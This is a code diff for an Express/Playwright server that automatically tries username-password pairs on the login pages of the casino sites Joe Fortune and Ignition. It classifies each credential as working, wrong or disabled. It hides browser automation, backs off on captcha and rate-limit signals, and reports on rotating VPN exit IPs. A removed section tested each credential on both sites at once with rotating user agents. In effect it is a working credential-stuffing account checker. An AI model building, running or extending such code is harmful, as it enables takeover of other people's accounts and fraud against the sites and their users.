@@ -21,11 +21,11 @@ import path from 'path';
 import fs from 'fs';
 import fsp from 'fs/promises';
 import crypto from 'crypto';
-import https from 'https';
-import { execFileSync } from 'child_process';
 import { fileURLToPath } from 'url';
 import { PNG } from 'pngjs';
 import pixelmatch from 'pixelmatch';
+import os from 'os';
+import { normalizeAutomationUrl, nextBackoffMs } from './server-utils.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
@@ -41,118 +41,9 @@ const SHOTS_DIR    = path.join(__dirname, 'debug-shots');
 const SESSIONS_DIR = path.join(__dirname, 'sessions');
 /** Root folder for structured JSONL logs (one line per event). */
 const LOGS_DIR     = path.join(__dirname, 'logs');
-/** Root folder for preinstalled Chromium extensions (unpacked). */
-const EXTENSIONS_DIR = path.join(__dirname, 'extensions');
-for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR, EXTENSIONS_DIR]) {
+for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR]) {
   try { fs.mkdirSync(d, { recursive: true }); } catch {}
 }
-
-// ── SelectorsHub Chrome Extension (preinstalled) ────────────────────────────
-/** Chrome Web Store extension ID for SelectorsHub. */
-const SELECTORSHUB_EXT_ID = 'ndgimibanhlabgdgjcpbbndiehljcpfh';
-/** Local on-disk path where the unpacked extension lives. */
-const SELECTORSHUB_DIR    = path.join(EXTENSIONS_DIR, 'selectorshub');
-
-/** Stream-download a URL to a local file, following redirects. */
-function _httpsDownload(url, destPath, redirects = 5) {
-  return new Promise((resolve, reject) => {
-    const req = https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
-      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location && redirects > 0) {
-        res.resume();
-        return _httpsDownload(res.headers.location, destPath, redirects - 1).then(resolve, reject);
-      }
-      if (res.statusCode !== 200) {
-        res.resume();
-        return reject(new Error(`download failed: HTTP ${res.statusCode} for ${url}`));
-      }
-      const out = fs.createWriteStream(destPath);
-      res.pipe(out);
-      out.on('finish', () => out.close(() => resolve(destPath)));
-      out.on('error', reject);
-    });
-    req.on('error', reject);
-  });
-}
-
-/**
- * CRX files are a custom header followed by a regular ZIP archive.
- *   CRX2: "Cr24" magic (4) + version (4) + pubKeyLen (4) + sigLen (4) + key + sig + zip
- *   CRX3: "Cr24" magic (4) + version (4) + headerLen (4) + header + zip
- * Strip the header so the resulting file is a plain ZIP we can unzip.
- */
-function _stripCrxHeader(crxPath, zipPath) {
-  const buf = fs.readFileSync(crxPath);
-  if (buf.slice(0, 4).toString() !== 'Cr24') {
-    throw new Error('not a CRX file (bad magic)');
-  }
-  const version = buf.readUInt32LE(4);
-  let zipStart;
-  if (version === 2) {
-    const pubKeyLen = buf.readUInt32LE(8);
-    const sigLen    = buf.readUInt32LE(12);
-    zipStart = 16 + pubKeyLen + sigLen;
-  } else if (version === 3) {
-    const headerLen = buf.readUInt32LE(8);
-    zipStart = 12 + headerLen;
-  } else {
-    throw new Error(`unsupported CRX version ${version}`);
-  }
-  fs.writeFileSync(zipPath, buf.slice(zipStart));
-}
-
-/**
- * Ensures the SelectorsHub extension is downloaded and unpacked at
- * SELECTORSHUB_DIR. Idempotent: if a manifest.json already exists, it returns
- * immediately. Never throws — on failure logs a warning and returns null so
- * browser launches still succeed without the extension.
- * @returns {Promise<string|null>} path to unpacked extension dir, or null.
- */
-async function ensureSelectorsHubExtension() {
-  try {
-    const manifestPath = path.join(SELECTORSHUB_DIR, 'manifest.json');
-    if (fs.existsSync(manifestPath)) return SELECTORSHUB_DIR;
-    fs.mkdirSync(SELECTORSHUB_DIR, { recursive: true });
-    const tmpCrx = path.join(EXTENSIONS_DIR, `${SELECTORSHUB_EXT_ID}.crx`);
-    const tmpZip = path.join(EXTENSIONS_DIR, `${SELECTORSHUB_EXT_ID}.zip`);
-    const url =
-      `https://clients2.google.com/service/update2/crx?response=redirect` +
-      `&os=mac&arch=x64&os_arch=x86_64&nacl_arch=x86-64` +
-      `&prod=chromiumcrx&prodchannel=unknown&prodversion=124.0.0.0` +
-      `&acceptformat=crx2,crx3&x=id%3D${SELECTORSHUB_EXT_ID}%26uc`;
-    logEvent('info', 'extension.download.start', { id: SELECTORSHUB_EXT_ID });
-    await _httpsDownload(url, tmpCrx);
-    _stripCrxHeader(tmpCrx, tmpZip);
-    execFileSync('unzip', ['-o', '-q', tmpZip, '-d', SELECTORSHUB_DIR], { stdio: 'ignore' });
-    try { fs.unlinkSync(tmpCrx); } catch {}
-    try { fs.unlinkSync(tmpZip); } catch {}
-    if (!fs.existsSync(manifestPath)) throw new Error('manifest.json missing after unzip');
-    logEvent('info', 'extension.installed', { id: SELECTORSHUB_EXT_ID, dir: SELECTORSHUB_DIR });
-    return SELECTORSHUB_DIR;
-  } catch (err) {
-    logEvent('warn', 'extension.install.failed', { id: SELECTORSHUB_EXT_ID, error: String(err.message || err) });
-    return null;
-  }
-}
-
-/**
- * Returns the Chromium launch args to load preinstalled extensions. Empty
- * array if no extensions are available. Extensions only work in non-headless
- * mode — caller is responsible for skipping these args for headless launches.
- */
-function extensionLaunchArgs() {
-  const dirs = [];
-  try {
-    if (fs.existsSync(path.join(SELECTORSHUB_DIR, 'manifest.json'))) dirs.push(SELECTORSHUB_DIR);
-  } catch {}
-  if (!dirs.length) return [];
-  const list = dirs.join(',');
-  return [`--load-extension=${list}`, `--disable-extensions-except=${list}`];
-}
-
-// Kick off the install in the background so the first run isn't blocked
-// waiting for the download. Subsequent launches (after install completes)
-// will pick up the args via extensionLaunchArgs().
-ensureSelectorsHubExtension();
 // Serve screenshots at /shots/<runId>/<file>.png so the webapp can load them
 // directly from disk rather than carrying multi-MB base64 blobs in localStorage.
 app.use('/shots', express.static(SHOTS_DIR, { maxAge: '1h' }));
@@ -235,6 +126,7 @@ function startRun(meta) {
 }
 function endRun(handle, extra = {}) {
   if (!handle) return;
+  if (!runRegistry.has(handle.runId)) return;
   runRegistry.delete(handle.runId);
   broadcast('run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
   logEvent('info', 'run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
@@ -302,7 +194,7 @@ async function applyDomainThrottle(url) {
  */
 function bumpDomainBackoff(host) {
   const cfg = _throttleFor(host);
-  cfg.backoffMs = Math.min(60_000, cfg.backoffMs ? cfg.backoffMs * 2 : 2_000);
+  cfg.backoffMs = nextBackoffMs(cfg.backoffMs, BACKOFF_BASE_MS, BACKOFF_MAX_MS);
   logEvent('warn', 'throttle.backoff.bump', { host, backoffMs: cfg.backoffMs });
 }
 function resetDomainBackoff(host) {
@@ -314,7 +206,7 @@ function resetDomainBackoff(host) {
 // ── Constants ────────────────────────────────────────────────────────────────
 
 /** Port the server listens on. */
-const PORT = 8791;
+const PORT = Number(process.env.PORT || 8791);
 
 /**
  * Browser launch options for all automation contexts.
@@ -333,6 +225,12 @@ const NAV_TIMEOUT = 30000;
 
 /** How long to wait after submitting a form before taking a screenshot. */
 const POST_SUBMIT_WAIT = 3000;
+/** Base delay used when entering backoff after 429/captcha signals. */
+const BACKOFF_BASE_MS = Number(process.env.BACKOFF_BASE_MS || 2000);
+/** Max delay cap used for exponential backoff. */
+const BACKOFF_MAX_MS = Number(process.env.BACKOFF_MAX_MS || 60000);
+/** Hard per-run watchdog timeout to prevent indefinite hangs. */
+const RUN_TIMEOUT_MS = Number(process.env.RUN_TIMEOUT_MS || 180000);
 
 // ── Single-Browser Serial Mutex ──────────────────────────────────────────────
 // Hard guarantee: only ONE Chromium process / one automation runs at a time.
@@ -367,9 +265,8 @@ async function getBrowser(live) {
   const existing = browserPool[key];
   if (existing && existing.isConnected()) return existing;
 
-  if (live) await ensureSelectorsHubExtension();
   const launchArgs = live
-    ? [...BROWSER_ARGS, '--window-size=540,840', '--window-position=40,40', ...extensionLaunchArgs()]
+    ? [...BROWSER_ARGS, '--window-size=540,420', '--window-position=40,40']
     : BROWSER_ARGS;
   const b = await chromium.launch({
     headless: !live,
@@ -394,8 +291,22 @@ async function shutdownBrowserPool() {
     }
   }
 }
-process.once('SIGINT',  () => shutdownBrowserPool().finally(() => process.exit(0)));
-process.once('SIGTERM', () => shutdownBrowserPool().finally(() => process.exit(0)));
+async function shutdownActiveRuns(reason) {
+  const activeRuns = Array.from(runRegistry.values());
+  for (const h of activeRuns) {
+    try { h.controller?.abort(); } catch {}
+    try { await h.page?.close(); } catch {}
+    try { await h.context?.close(); } catch {}
+    endRun(h, { outcome: 'aborted', reason });
+  }
+}
+async function gracefulShutdown(signalName) {
+  await shutdownActiveRuns(signalName);
+  await shutdownBrowserPool();
+  process.exit(0);
+}
+process.once('SIGINT',  () => gracefulShutdown('SIGINT'));
+process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
 
 // ── storageState Session Persistence ─────────────────────────────────────────
 /**
@@ -666,8 +577,7 @@ async function captureShotBuf(page, label) {
         document.body.appendChild(el);
       }, [BADGE_ID, label]).catch(() => {});
     }
-    await page.evaluate(() => window.scrollTo(0, 0)).catch(() => {});
-    const buf = await page.screenshot({ fullPage: true, type: 'png' });
+    const buf = await page.screenshot({ fullPage: false, type: 'png' });
     if (label) {
       await page.evaluate((id) => { document.getElementById(id)?.remove(); }, BADGE_ID).catch(() => {});
     }
@@ -1142,6 +1052,94 @@ app.get('/api/status', (req, res) => {
   });
 });
 
+// ── API: VPN Status ──────────────────────────────────────────────────────────
+
+/**
+ * GET /api/vpn-status
+ * Returns NordLynx VPN status including connection state and public IP.
+ * Used by the webapp dashboard to show VPN rotation status.
+ */
+app.get('/api/vpn-status', async (req, res) => {
+  try {
+    const { exec } = await import('child_process');
+    const { promisify } = await import('util');
+    const execAsync = promisify(exec);
+    
+    // Check if wg command exists and get VPN status
+    let vpnConnected = false;
+    let vpnInterface = null;
+    try {
+      const { stdout: wgOutput } = await execAsync('/opt/homebrew/bin/wg show 2>/dev/null || echo "offline"');
+      vpnConnected = wgOutput.includes('interface:');
+      if (vpnConnected) {
+        const match = wgOutput.match(/interface: (\w+)/);
+        vpnInterface = match ? match[1] : 'unknown';
+      }
+    } catch {}
+    
+    // Get public IP
+    let publicIp = null;
+    let ipSource = null;
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 3000);
+      const ipRes = await fetch('https://ifconfig.me', { 
+        signal: controller.signal,
+        headers: { 'User-Agent': 'curl/7.64.1' }
+      });
+      clearTimeout(timeout);
+      if (ipRes.ok) {
+        publicIp = await ipRes.text();
+        ipSource = 'ifconfig.me';
+      }
+    } catch {}
+    
+    // Check LaunchAgent status
+    let rotationEnabled = false;
+    let nextRotation = null;
+    try {
+      const { stdout: launchctlOutput } = await execAsync('launchctl list com.user.nordlynx 2>/dev/null || echo "not loaded"');
+      rotationEnabled = launchctlOutput.includes('com.user.nordlynx');
+      
+      // Get last rotation time from log if available
+      const logPath = path.join(__dirname, 'logs', 'vpn-rotations.jsonl');
+      if (fs.existsSync(logPath)) {
+        const lines = fs.readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean);
+        if (lines.length > 0) {
+          const last = JSON.parse(lines[lines.length - 1]);
+          nextRotation = new Date(last.ts).getTime() + 300000; // 5 min interval
+        }
+      }
+    } catch {}
+    
+    // Count available configs
+    let configCount = 0;
+    try {
+      const configDir = path.join(os.homedir(), '.nordlynx', 'configs');
+      if (fs.existsSync(configDir)) {
+        configCount = fs.readdirSync(configDir).filter(f => f.endsWith('.conf')).length;
+      }
+    } catch {}
+    
+    res.json({
+      ok: true,
+      vpn: {
+        connected: vpnConnected,
+        interface: vpnInterface,
+        publicIp: publicIp,
+        ipSource: ipSource,
+        rotationEnabled: rotationEnabled,
+        nextRotation: nextRotation,
+        configCount: configCount,
+        intervalSeconds: 300,
+      },
+      timestamp: new Date().toISOString(),
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
 // ── API: Login Check ─────────────────────────────────────────────────────────
 
 /** Maximum number of login attempts before declaring noAcc. */
@@ -1193,6 +1191,11 @@ async function waitForLoginResponse(page, maxWaitMs = RESPONSE_POLL_MS, site = '
     if (/your email and\/or password remain incorrect.*further failed attempt/i.test(body)) return RESP.WRONG_PASS_2;
     if (/oops.*your email and\/or password are incorrect.*caps lock/i.test(body)) return RESP.WRONG_PASS_1;
 
+    // Ignition-specific wrong-password text
+    if (site === 'ign') {
+      if (/incorrect (email|username|password)|invalid (email|username|password|credentials)/i.test(body)) return RESP.WRONG_PASS_1;
+    }
+
     // ── Success: URL must have left the login page AND auth-only signals ──
     const isOffLoginPage = !url.includes('/login')
       && !url.includes('/sign-in')
@@ -1221,14 +1224,24 @@ async function isLoggedIn(page, site) {
   try {
     // 1. Auth-only DOM elements — logout button / profile menu / balance chip.
     //    These are absent when logged out.
-    // Joe Fortune locator list applied to all sites (Ignition mirrored from Joe).
-    const authOnlyLocators = [
-      'a:has-text("Logout")', 'a:has-text("Log Out")', 'a:has-text("Sign Out")',
-      'button:has-text("Logout")', 'button:has-text("Deposit")',
-      '[class*="user-avatar"]', '[class*="profile-avatar"]',
-      '[class*="balance"]', '[data-testid*="balance" i]',
-      'a[href*="/account"]', 'a[href*="/cashier"]',
-    ];
+    const authOnlyLocators = site === 'ign'
+      ? [
+          'a:has-text("Log Out")', 'a:has-text("Log out")', 'a:has-text("Logout")',
+          'button:has-text("Log Out")', 'button:has-text("Logout")',
+          '[data-testid*="logout" i]',
+          '[class*="user-menu"]', '[class*="account-menu"]',
+          '[class*="balance"]', '[data-testid*="balance" i]',
+          'a[href*="/cashier"]', 'a[href*="/account"]:has-text("Account")',
+          'button:has-text("Deposit")',
+        ]
+      : [
+          // Joe Fortune: logout link, balance, user avatar, deposit button
+          'a:has-text("Logout")', 'a:has-text("Log Out")', 'a:has-text("Sign Out")',
+          'button:has-text("Logout")', 'button:has-text("Deposit")',
+          '[class*="user-avatar"]', '[class*="profile-avatar"]',
+          '[class*="balance"]', '[data-testid*="balance" i]',
+          'a[href*="/account"]', 'a[href*="/cashier"]',
+        ];
 
     for (const sel of authOnlyLocators) {
       const el = page.locator(sel).first();
@@ -1288,6 +1301,9 @@ async function classifyLoginOutcome(page, site) {
         || /email and\/or password are incorrect/i.test(body)) {
       return { type: 'BAD_CREDS', stage: 1 };
     }
+    if (site === 'ign' && /incorrect (email|username|password)|invalid (email|username|password|credentials)/i.test(body)) {
+      return { type: 'BAD_CREDS', stage: 1 };
+    }
 
     // ── Success: off-login URL OR visible welcome banner + auth-only DOM ────
     const offLogin = !url.includes('/login')
@@ -1306,279 +1322,6 @@ async function classifyLoginOutcome(page, site) {
     return { type: 'UNKNOWN' };
   }
 }
-
-// ── PAIRED MODE (experimental — completely isolated from single-site flow) ──
-// Rotating UA pool used ONLY by the paired endpoint. Each credential gets a
-// fresh UA picked round-robin; both sides of the pair share the same UA so
-// the two windows look like the same client hitting two different sites.
-const PAIR_USER_AGENTS = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
-  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-];
-let _pairUaIndex = 0;
-function nextPairUserAgent() {
-  const ua = PAIR_USER_AGENTS[_pairUaIndex % PAIR_USER_AGENTS.length];
-  _pairUaIndex = (_pairUaIndex + 1) % PAIR_USER_AGENTS.length;
-  return ua;
-}
-// Adds a new automation lane that opens TWO live browser windows side-by-side
-// (Joe on the left, Ignition on the right) and tests the SAME credential
-// pair in parallel against both sites. Implemented as 100% additive code:
-// nothing in the existing /api/login-check or single-site flow is touched.
-const pairBrowserPool = { joeSlot: null, ignSlot: null };
-async function getPairBrowser(slot) {
-  const existing = pairBrowserPool[slot];
-  if (existing && existing.isConnected()) return existing;
-  const xy = slot === 'joeSlot' ? '40,40' : '600,40';
-  await ensureSelectorsHubExtension();
-  const args = [
-    '--no-sandbox', '--disable-setuid-sandbox',
-    '--disable-blink-features=AutomationControlled', '--disable-infobars',
-    '--window-size=540,840', `--window-position=${xy}`,
-    ...extensionLaunchArgs(),
-  ];
-  const b = await chromium.launch({ headless: false, args, slowMo: 120 });
-  b.on('disconnected', () => { if (pairBrowserPool[slot] === b) pairBrowserPool[slot] = null; });
-  pairBrowserPool[slot] = b;
-  logEvent('info', 'pair.browser.launched', { slot });
-  return b;
-}
-let _pairChain = Promise.resolve();
-function runPairExclusive(fn) {
-  const next = _pairChain.then(() => fn(), () => fn());
-  _pairChain = next.catch(() => {});
-  return next;
-}
-
-/**
- * One side of the paired login. Mirrors single-site logic (3 submits, freeze
- * navigation, classify, screenshots) but runs against a pre-allocated browser
- * for its dedicated window slot. Returns a per-side result object.
- */
-async function runPairSide({ slot, siteId, username, password, loginUrl, timeout, postSubmitWait, runId, signal, userAgent }) {
-  const sideTag = `${siteId}_pair`;
-  const shotBufs = [null, null, null, null];
-  const shotUrls = ['', '', '', ''];
-  const shotDataUrls = ['', '', '', ''];
-  let outcome = 'noAcc';
-  let note = 'Paired check did not complete';
-  let attemptLog = [];
-  let context;
-  const persist = async (buf, i) => {
-    shotBufs[i] = buf;
-    const meta = await persistShotBuffer(buf, `${runId}-${sideTag}`, i + 1);
-    shotUrls[i] = meta.url;
-    shotDataUrls[i] = meta.dataUrl;
-    return meta.dataUrl;
-  };
-  try {
-    const browser = await getPairBrowser(slot);
-    context = await browser.newContext({
-      viewport: { width: 540, height: 840 },
-      userAgent: userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      ignoreHTTPSErrors: true,
-    });
-    const page = await context.newPage();
-    page.setDefaultTimeout(timeout);
-    const netSnap = attachNetworkHooks(page);
-    const bail = () => { if (signal && signal.aborted) throw new Error('run cancelled'); };
-    let frozen = false;
-    await page.route('**/*', (route) => {
-      try {
-        const req = route.request();
-        if (frozen && req.resourceType() === 'document' && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
-          return route.abort();
-        }
-      } catch {}
-      return route.continue();
-    });
-
-    bail();
-    const windowOpenedAt = Date.now();
-    try {
-      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
-    } catch (navErr) {
-      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
-      const buf = await captureShotBuf(page, 'PAIR 1/4').catch(() => null);
-      await persist(buf, 0); await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
-      return { siteId, outcome: 'noAcc', note, shotUrls, shots: shotDataUrls, attempts: attemptLog };
-    }
-    await page.waitForTimeout(2000);
-    await dismissCookiePopup(page);
-    await fillLoginForm(page, username, password);
-    await page.waitForTimeout(700);
-    bail();
-    await persist(await captureShotBuf(page, 'PAIR 1/4').catch(() => null), 0);
-
-    frozen = true;
-    await page.evaluate(() => {
-      try {
-        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; }, true);
-        const noop = () => {};
-        try { window.location.assign  = noop; } catch {}
-        try { window.location.replace = noop; } catch {}
-        try { window.location.reload  = noop; } catch {}
-        document.addEventListener('submit', (e) => {
-          try { if (e.target && e.target.tagName === 'FORM') e.preventDefault(); } catch {}
-        }, true);
-      } catch {}
-    }).catch(() => {});
-
-    const MAX_ATTEMPTS = 4;
-    let classification = { type: 'UNKNOWN' };
-    let attempts = 0;
-    let prevAttemptBuf = null;
-    for (let n = 1; n <= MAX_ATTEMPTS; n++) {
-      bail();
-      const pwdLoc = page.locator('input[type="password"]:visible').first();
-      if (await pwdLoc.isVisible({ timeout: 200 }).catch(() => false)) {
-        const val = await pwdLoc.inputValue().catch(() => '');
-        if (!val) await fillLoginForm(page, username, password).catch(() => {});
-      }
-      // PAIR mode: press Enter from the password field as the FIRST option
-      // (overrides any prior rule). Fall back to #loginSubmit, then the
-      // generic clickSubmit helper, then a bare Enter on whatever is focused.
-      let clicked = false;
-      try {
-        const pwd = page.locator('input[type="password"]:visible').first();
-        if (await pwd.isVisible({ timeout: 200 }).catch(() => false)) {
-          await pwd.focus().catch(() => {});
-          await pwd.press('Enter').catch(() => {});
-          clicked = true;
-        }
-      } catch {}
-      if (!clicked) {
-        try {
-          const sub = page.locator('#loginSubmit').first();
-          if ((await sub.count()) > 0) {
-            await sub.click({ timeout: 1500, force: false }).catch(async () => {
-              await sub.evaluate(n => n.click()).catch(() => {});
-            });
-            clicked = true;
-          }
-        } catch {}
-      }
-      if (!clicked) clicked = await clickSubmit(page).catch(() => false);
-      if (!clicked) await page.keyboard.press('Enter').catch(() => {});
-      await page.waitForTimeout(postSubmitWait).catch(() => {});
-      await dismissCookiePopup(page).catch(() => {});
-      bail();
-      const buf  = await captureShotBuf(page, `pair-attempt-${n}`).catch(() => null);
-      const html = await page.content().catch(() => '');
-      await persistAttemptArtifacts(buf, html, `${runId}-${sideTag}`, n);
-      const diffStats = await persistAttemptDiff(prevAttemptBuf, buf, `${runId}-${sideTag}`, n);
-      prevAttemptBuf = buf;
-      if (n === 1) await persist(buf, 1);
-      await persist(buf, 2);
-      attempts = n;
-      classification = await classifyLoginOutcome(page, siteId);
-      attemptLog.push({
-        n, type: classification.type,
-        ...(classification.perm != null ? { perm: classification.perm } : {}),
-        ...(diffStats ? { diff: { url: diffStats.url, changedPixels: diffStats.changedPixels, changedPct: diffStats.changedPct } } : {}),
-      });
-    }
-
-    const siteName = siteId === 'ign' ? 'Ignition' : 'Joe Fortune';
-    if (classification.type === 'SUCCESS') {
-      outcome = 'working';
-      note = `${siteName} — pair login successful (attempt ${attempts}/${MAX_ATTEMPTS})`;
-    } else if (classification.type === 'DISABLED' && classification.perm) {
-      outcome = 'permDisabled';
-      note = `${siteName} — account permanently disabled`;
-    } else if (classification.type === 'DISABLED') {
-      outcome = 'tempDisabled';
-      note = `${siteName} — temporarily disabled (too many failed attempts)`;
-    } else if (classification.type === 'BAD_CREDS') {
-      outcome = 'noAcc';
-      note = `${siteName} — incorrect credentials after ${attempts} attempt(s)`;
-    } else {
-      outcome = 'noAcc';
-      note = `${siteName} — no conclusive signal after ${attempts} attempt(s)`;
-    }
-    if (netSnap && outcome === 'noAcc' && netSnap.authSuccess && !netSnap.authFailure) {
-      outcome = 'working';
-      note = `${siteName} — pair success confirmed by network auth response`;
-    }
-
-    await page.waitForTimeout(2000).catch(() => {});
-    await dismissCookiePopup(page).catch(() => {});
-    bail();
-    await persist(await captureShotBuf(page, 'PAIR 4/4').catch(() => null), 3);
-
-    await context.clearCookies().catch(() => {});
-    await page.evaluate(() => { try { localStorage.clear(); sessionStorage.clear(); } catch {} }).catch(() => {});
-  } catch (err) {
-    note = `Pair side error: ${err.message}`;
-    outcome = 'noAcc';
-    logEvent('error', 'pair.side.error', { runId, siteId, error: err.message });
-  } finally {
-    if (context) await context.close().catch(() => {});
-  }
-  return { siteId, outcome, note, shotUrls, shots: shotDataUrls, attempts: attemptLog };
-}
-
-/**
- * POST /api/login-check-pair
- * Runs the same credential against Joe + Ignition simultaneously in two
- * separate visible browser windows.
- *
- * Body: { username, password, joeUrl, ignUrl, timeout?, postSubmitWait? }
- * Returns: { runId, joe: {...}, ign: {...} }
- */
-app.post('/api/login-check-pair', async (req, res) => {
-  const {
-    username, password,
-    joeUrl, ignUrl,
-    timeout = NAV_TIMEOUT,
-    postSubmitWait: postSubmitWaitRaw,
-  } = req.body;
-  const postSubmitWait = Math.max(500, Math.min(15000, parseInt(postSubmitWaitRaw) || 3000));
-  if (!username || !password || !joeUrl || !ignUrl) {
-    return res.status(400).json({ error: 'Missing username, password, joeUrl, or ignUrl' });
-  }
-  const runHandle = startRun({ kind: 'pair', username, joeUrl, ignUrl });
-  await runPairExclusive(async () => {
-    const signal = runHandle.controller.signal;
-    const userAgent = nextPairUserAgent();
-    logEvent('info', 'pair.ua.rotate', { runId: runHandle.runId, username, userAgent });
-    let joeRes, ignRes;
-    try {
-      [joeRes, ignRes] = await Promise.all([
-        runPairSide({ slot: 'joeSlot', siteId: 'joe', username, password, loginUrl: joeUrl, timeout, postSubmitWait, runId: runHandle.runId, signal, userAgent }),
-        runPairSide({ slot: 'ignSlot', siteId: 'ign', username, password, loginUrl: ignUrl, timeout, postSubmitWait, runId: runHandle.runId, signal, userAgent }),
-      ]);
-    } catch (err) {
-      logEvent('error', 'pair.run.error', { runId: runHandle.runId, error: err.message });
-    } finally {
-      endRun(runHandle, { kind: 'pair', username });
-    }
-    broadcast('pair.result', { runId: runHandle.runId, username, joe: joeRes, ign: ignRes, userAgent });
-    if (!res.headersSent) res.json({
-      runId: runHandle.runId,
-      joe: joeRes || { outcome: 'noAcc', note: 'Joe side failed to start', shotUrls: ['','','',''], shots: ['','','',''], attempts: [] },
-      ign: ignRes || { outcome: 'noAcc', note: 'Ignition side failed to start', shotUrls: ['','','',''], shots: ['','','',''], attempts: [] },
-    });
-  });
-});
 
 /**
  * POST /api/login-check
@@ -1619,14 +1362,27 @@ app.post('/api/login-check', async (req, res) => {
   if (!username || !password || !loginUrl) {
     return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
   }
+  let normalizedLoginUrl;
+  try {
+    normalizedLoginUrl = normalizeAutomationUrl(loginUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid loginUrl: ${err.message}` });
+  }
 
   // Register the run FIRST (outside the mutex) so the client can immediately
   // see it and cancel it. The actual work still serialises behind the mutex.
-  const runHandle = startRun({ site, username, loginUrl, kind: 'login' });
+  const runHandle = startRun({ site, username, loginUrl: normalizedLoginUrl, kind: 'login' });
+  const runTimeoutHandle = setTimeout(() => {
+    if (runRegistry.has(runHandle.runId)) {
+      try { runHandle.controller.abort(); } catch {}
+      logEvent('warn', 'run.timeout', { runId: runHandle.runId, kind: 'login', timeoutMs: RUN_TIMEOUT_MS });
+    }
+  }, RUN_TIMEOUT_MS);
 
   // Domain-aware throttling: respect cooldowns / backoff before starting.
-  await applyDomainThrottle(loginUrl);
+  await applyDomainThrottle(normalizedLoginUrl);
 
+  try {
   await runExclusive(async () => {
   let context;
   const shotBufs = [null, null, null, null];
@@ -1636,7 +1392,7 @@ app.post('/api/login-check', async (req, res) => {
   let note = 'Check did not complete';
   let netSnap = null;
   let attemptLog = []; // [{ n, type, perm? }] — forensic audit of every submit
-  const host = _hostOf(loginUrl);
+  const host = _hostOf(normalizedLoginUrl);
   const signal = runHandle.controller.signal;
 
   /** Persist a shot buf (or null) into slot i and return its dataUrl. */
@@ -1654,7 +1410,7 @@ app.post('/api/login-check', async (req, res) => {
     const browser = await getBrowser(!!liveView);
     const storageState = reuseSession ? await loadStorageState(site, username) : undefined;
     context = await browser.newContext({
-      viewport: liveView ? { width: 540, height: 840 } : { width: 1280, height: 800 },
+      viewport: liveView ? { width: 540, height: 420 } : { width: 1280, height: 800 },
